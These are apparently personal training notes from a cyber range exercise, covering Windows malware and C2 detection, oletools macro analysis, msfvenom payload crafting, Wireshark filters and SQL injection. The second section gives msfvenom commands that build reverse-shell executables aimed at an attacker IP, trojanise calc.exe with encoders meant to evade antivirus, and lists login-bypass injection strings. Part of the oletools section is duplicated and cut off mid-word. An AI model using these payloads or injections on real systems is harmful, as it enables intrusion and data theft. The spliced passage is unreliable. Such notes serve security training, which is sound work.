<!-- ASD Programme Logo -->
<p align="center">
  <img src="https://github.com/simon-im-security/ASD-Live-Fire-Exchange-Program/blob/main/Australian_Signals_Directorate_program_logo.png" alt="ASD Programme Logo" width="300">
</p>

<p><strong>These are my personal notes from the <em>ASD Live Fire Cyberbitrange</em> event. This document is not provided by or affiliated with the <em>Australian Signals Directorate (ASD)</em> or <em>CyberbitRange</em>.</strong></p>

---

<details>
<summary><strong>🌐 LFE 1 Bangalore - Malicious Detection</strong></summary>## Scenario: Command and Control (C2) Detection

- Gather logs using Event Viewer
- Identify malware via IOCs
- Remove malware and kill process
- Investigate network activity (C2)
- Block source and set firewall rules
- Remove persistence (startup/registry/scheduled tasks)

### 🔧 Tools Available

| Tool Name             | Functionality               |
|-----------------------|-----------------------------|
| CyberChef             | Data analysis and decoding  |
| DnSpy                 | .NET debugging/decompiling  |
| Eric Zimmerman Tools | Windows forensics           |
| Ghidra                | Reverse engineering         |
| oletools              | Office macro analysis       |
| Pestudio              | Static malware analysis     |
| Sysinternals          | Advanced monitoring         |
| WinSCP                | Secure file transfers       |

### 🧱 Step 1: Process Monitoring
```powershell
taskmgr

tasklist | findstr /i "powershell cmd python wscript cscript mshta wmic rundll32 regsvr32 schtasks bitsadmin"

taskkill /F /PID <PID>

eventvwr
```

### 🗓 Step 2: Scheduled Tasks
```powershell
taskschd

Get-ScheduledTask | ? {
  $_.TaskPath -notmatch "^\\Microsoft\\Windows" -and 
  ($_.Actions | % Execute | Out-String) -match "cmd|powershell|python|wscript|cscript|.bat|.vbs|.js|.py|mshta|rundll32|schtasks|bitsadmin"
}

Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
```

### 🧼 Step 3: Registry Startup
```powershell
regedit

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

### 🌐 Step 4: Network Communications
```powershell
netstat -bano
```

### 📁 Step 5: File Investigation
```powershell
Get-ChildItem -Path C:\Users -Include *.xlsx,*.docx,*.pdf -File -Recurse -ErrorAction SilentlyContinue
```

</details>

---

<details>
<summary><strong>🌋 LFE 2 Jakarta - Multi-Stage Malware & Analysis</strong></summary>

### 🛠 Topics Covered
- Office macro analysis with oletools
- Payload creation using msfvenom
- File encryption via OpenSSL
- Network inspection with Wireshark
- Basic SQL injection testing

###### 🔎 Macro Analysis with `oletools`

`oletools` is a Python-based toolset for analysing Microsoft OLE2 files (e.g. Office documents). It helps detect malicious macros, extract metadata, and uncover indicators of compromise.

#### 🔧 Common Tools & Flags:
```bash
olevba -a suspicious.doc      # Full analysis
olevba -c suspicious.doc      # Extract macro code only
olevba --decode suspicious.doc # Decode obfuscated content
olevba --json suspicious.doc  # Output in JSON

mraptor suspicious.doc        # Detect risknts). It helps detect malicious macros, extract metadata, and uncover indicators of compromise.

#### 🔧 Common Tools & Flags:
```bash
olevba -a suspicious.doc      # Full analysis
olevba -c suspicious.doc      # Extract macro code only
olevba --decode suspicious.doc # Decode obfuscated content
olevba --json suspicious.doc  # Output in JSON

mraptor suspiciota --json suspicious.doc

oleid suspicious.doc          # File structure and risk features
oleid --json suspicious.doc

oleobj -e -d output suspicious.doc # Extract embedded OLE objects
rtfobj -d output suspicious.rtf    # Extract objects from RTF
```

### 💣 Payload Crafting with `msfvenom`

`msfvenom` combines `msfpayload` and `msfencode`, allowing you to create encoded payloads in various formats for different platforms.

#### 🧪 Command Structure:
```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output> [-e <encoder>] [-i <iterations>] [-x <template.exe>]
```

#### 🧾 Flag Breakdown:
- `-p`: Payload type (e.g., `windows/meterpreter/reverse_tcp`)
- `LHOST`: Attacker IP to receive the connection
- `LPORT`: Listener port
- `-f`: Output format (e.g., `exe`, `elf`, `asp`, `raw`, `psh`)
- `-o`: Output filename
- `-e`: Encoder (e.g., `x86/shikata_ga_nai`)
- `-i`: Number of encoding iterations
- `-x`: Inject into a legitimate executable (trojanise)

#### 📦 Common Formats:
- `exe`: Windows executables
- `elf`: Linux binaries
- `psh`: PowerShell commands
- `raw`, `asp`, `war`, `vbscript`, `bash`, `c`, etc.

#### 🔁 Encoders:
Encoders help obfuscate payloads to evade signature-based AV:
```bash
msfvenom -l encoders
```
Example encoder: `x86/shikata_ga_nai`

#### 🧰 Examples:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 -f exe -o payload.exe
```
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 -f exe -x C:\Windows\System32\calc.exe -o mal.exe -e x86/shikata_ga_nai -i 3
```

### 🔐 File Encryption with OpenSSL
```powershell
openssl.exe enc -aes-256-cbc -base64 -in "C:\Users\cyberuser\Desktop\Files\Pass.txt" -out "C:\Users\cyberuser\Desktop\Pass.enc" -K 000001234567890ABCDEFABCDEF -iv 0
```

### 📊 Wireshark Filters
```wireshark
frame.number == 1437
frame.number >= 1434 and frame.number <= 1440
tcp.analysis.retransmission
frame.number == 1437 and tcp.analysis.retransmission
```

### 🔢 SQL Injection Basics
**Used on login forms where inputs are not sanitised**

#### Sample Username/Password Inputs:
```plaintext
Username: ' OR 1=1;--
Password: (blank or anything)

Username: admin' --
Password: anything

Username: ' OR 'a'='a';--
Password: anything

Username: " OR ""="
Password: anything
```

#### Underlying Query Logic:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password';
```
Injecting:
```sql
SELECT * FROM users WHERE username = '' OR 1=1;--' AND password = '';
```

#### SQL Clause Order Reference:
1. `SELECT`
2. `FROM`
3. `WHERE`
4. `GROUP BY` / `HAVING`
5. `ORDER BY`

#### SQL Injection Prevention:
- Use prepared statements / parameterised queries
- Sanitize user inputs (strip/escape)
- Apply least privilege to DB accounts
- Log and alert on suspicious queries

</details>
